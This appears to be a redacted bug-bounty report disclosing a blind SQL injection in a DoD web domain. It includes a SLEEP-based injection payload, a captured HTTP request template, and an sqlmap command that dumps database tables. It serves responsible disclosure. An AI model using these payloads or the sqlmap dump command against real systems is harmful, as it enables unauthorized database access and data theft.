## Original Report

Hey DoD security team!

I was able to exploit an SQL injection [1] in one of your domains.

# Description

An SQL injection [1] was discovered in domain *https://████████/██████* in the parameter *██████████*. The SQL injection was located in a *WHERE* statment fallowed by a *INT* value.
The vulnerable parameter gave an indication quick with an *SQL syntax* error. That exposed it was an *████* database [2] in the backend.
 
# Proof Of Concept
Discovered the SQL injection by inputting an random value to trigger an SQL syntax error.
Discover_Payload: **██████████**
████

The fallowing payload was used for the SQL injection to be be triggered 
Payload: **2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)**
██████

Full exploit and gather information from the MYSQL database:

## Impact

An attacker is able to gather all information stored in the database using boolen based SQL injection. (FULL database controll.)

## System Host(s)
███████

## Affected Product(s) and Version(s)
The whole database is affected and I'm able to gather all information stored in it.

## CVE Numbers


## Steps to Reproduce
1. Go to the domain **
2. Now intercept the request with Burp Suite.
3. Replace the *raw* data with the fallowing:
```
POST /██████ HTTP/1.1
Host: ██████████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: https://█████████
Referer: https://████████/█████████
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

██████=2021█████
```
4 . Save request in Burp Suite => Right click => save item + *Name it*.
5. Run sqlmap command: **sqlmap -f --risk 2 -r /home/kali/Desktop/sql --dbms=mysql --tables --dump -p ██████████**.
It will quick discover the *███* to be vulnerable for SQL injection and XSS. Wait to it detect and verify it. It will then dump the tables.
as fallowing: (Only gather table and stoped after just as a proof of concept)

## Suggested Mitigation/Remediation Actions
Make sure to filter out SQL syntax and quotes and never trust user input.
